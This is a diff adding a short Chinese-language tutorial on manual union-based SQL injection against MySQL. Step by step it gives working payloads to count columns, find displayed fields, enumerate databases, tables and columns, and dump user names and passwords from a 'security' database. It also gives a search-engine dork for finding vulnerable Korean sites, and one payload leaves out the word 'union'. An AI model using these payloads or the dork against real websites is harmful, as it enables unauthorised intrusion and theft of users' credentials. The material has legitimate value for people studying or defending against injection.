@@ -1,0 +1,41 @@
+sql手工注入主要有一下几点这里已MySQL库为例
+1、发现漏洞；
+
+2、判断当前表的字段；
+
+3、用联合语句查看哪几位是有效位；
+
+4、查看当前数据库中有哪些表；
+
+5、查看表中有哪些属性；
+
+6、查看表中具体的数据信息;
+具体步骤如下：
+1、发现漏洞主要有两种
+（1）在id=1后加’这里的意思为结尾
+（2）添加条件如id=1后空格加1=2为假条件如果页面正常显示说明没有漏洞
+这里加一个在百度搜索注入的发式：site:kr inurl:php?id=
+2、判断当前字段
+（1）在后面加payload:?id=1' order by n %23这里%23%为注释，23为注释掉的内容
+如果n为3时页面正常，n为4时页面不正常，则可以判断有三个字段        。这里就假设我们得到的n为3，继续举例。
+3、用联合语句查看哪几位是有效位；
+（1）通过and 1=2 union select 1,2,3……,n联合查询判断显示字段是哪些
+payload:?id=1' and 1=2 union select 1,2,3……n  
+这里的n为我们上面通过order by n测试出来的那个值，这里我们取3。所以实际注入时就是?id=1' and 1=2 select 1,2,3
+提交后，可以看到页面中出现可以被显示的字段编号，我们通过在响应位置替换成我们需要的查询字段和表就可以，如这里，我注入出来的是2和3位置可以被注入，也就是接下来所有注入的内容更都需要替换这里select语句中的2和3
+
+4、暴出当前库和版本
+payload:?id=1' and 1=2 union select 1,database(),version() %23
+5、暴出其他数据库
+payload:?id=1' and 1=2 union select 1,schema_name,3 from information_schema.schemata limit 0,1%23
+通过调整limit即可遍历出所有的数据库，调整方法为limit 0,1;limit 1,2;limit 2,3……直到出现错误或异常
+6、暴对应数据库的数据表
+payload:?id=1' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=数据库名的十六进制 limit 0,1%23
+这里我用当前数据库来做演示，即security库
+遍历也是通过调整limit来实现的，方法同上
+7、暴对应数据库、数据表的各个字段
+payload:?id=1' and 1=2 union select 1,column_name,3 from information_schema.columns where table_schema=库名十六进制  and table_name=表名十六进制 limit 0,1%23这里我用security库和security中的users表来做演示
+遍历也是通过调整limit来实现的，方法同（4）
+8、暴数据，也就是我们常说的脱库
+payload:?id=1' and 1=2 union select 1,字段名,3 from 库名.表名 limit 0,1%23
+这里由于2和3位都是可用的，所以我可以在两个位同时显示两个字段。这里选用了security库的users表，我们只关注用户名和密码字段，所以只暴这两个字段即可遍历也是通过调整limit来实现的，方法同（4）
